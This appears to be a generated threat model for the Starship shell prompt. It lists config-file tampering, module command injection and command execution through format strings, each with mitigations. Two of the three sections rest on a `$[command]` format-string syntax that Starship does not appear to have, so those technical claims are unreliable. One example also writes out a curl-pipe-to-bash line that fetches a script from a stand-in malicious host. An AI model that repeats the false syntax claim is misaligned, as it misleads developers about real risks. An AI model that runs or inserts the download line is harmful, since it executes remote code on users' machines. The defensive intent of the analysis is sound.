# Attack Surface Analysis for starship/starship

## Attack Surface: [Configuration File Manipulation](./attack_surfaces/configuration_file_manipulation.md)

* **Attack Surface:** Configuration File Manipulation
    * **Description:** A malicious actor modifies Starship's configuration file (`starship.toml`) to execute arbitrary commands or alter the prompt to mislead users.
    * **How Starship Contributes:** Starship reads and applies the configurations defined in `starship.toml`. If this file is compromised, Starship will execute the attacker's instructions.
    * **Example:** An attacker modifies `starship.toml` to include a custom command in a module's `format` string like `format = "$[malicious_script.sh]"`, which executes upon shell initialization.
    * **Impact:** Arbitrary code execution with the privileges of the user running the shell, potentially leading to data breaches, system compromise, or denial of service.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * Restrict write access to the Starship configuration file to authorized users only.
        * Implement file integrity monitoring to detect unauthorized modifications to `starship.toml`.
        * If the application allows users to customize their Starship configuration, rigorously sanitize and validate user-provided input to prevent command injection.

## Attack Surface: [Command Injection via Starship Modules](./attack_surfaces/command_injection_via_starship_modules.md)

* **Attack Surface:** Command Injection via Starship Modules
    * **Description:** Vulnerabilities in Starship modules or the external commands they execute allow for the injection of malicious commands.
    * **How Starship Contributes:** Starship modules often execute external commands to gather information (e.g., Git status, Python virtual environment). If the arguments passed to these commands are not properly sanitized, it can lead to command injection.
    * **Example:** A vulnerable Git module in Starship might process branch names without proper sanitization, allowing an attacker to create a branch with a malicious name that, when processed by Starship, executes arbitrary commands.
    * **Impact:** Arbitrary code execution with the privileges of the user running the shell, potentially leading to data breaches, system compromise, or denial of service.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * Keep Starship updated to the latest version, as updates often include security fixes for module vulnerabilities.
        * Review the configuration of enabled Starship modules and understand which external commands they execute.
        * If possible, configure Starship to use safer alternatives or disable modules that are not strictly necessary.
        * Ensure the underlying external commands used by Starship modules are also kept up-to-date with security patches.

## Attack Surface: [Custom Command Execution via `format` String](./attack_surfaces/custom_command_execution_via__format__string.md)

* **Attack Surface:** Custom Command Execution via `format` String
    * **Description:** Starship's `format` string allows for the execution of arbitrary commands using the `$[command]` syntax, which can be exploited if user input is not properly sanitized.
    * **How Starship Contributes:** Starship's flexibility in allowing custom commands within the prompt format introduces a direct avenue for command execution if not handled carefully.
    * **Example:** If an application allows users to customize their Starship prompt format without proper sanitization, an attacker could inject `format = "$[curl malicious.site/exploit.sh | bash]"`.
    * **Impact:** Arbitrary code execution with the privileges of the user running the shell.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * Avoid allowing users to directly customize the `format` string, especially with the `$[command]` syntax.
        * If customization is necessary, implement extremely strict input validation and sanitization to prevent the injection of malicious commands. Consider disallowing the `$[command]` syntax entirely.
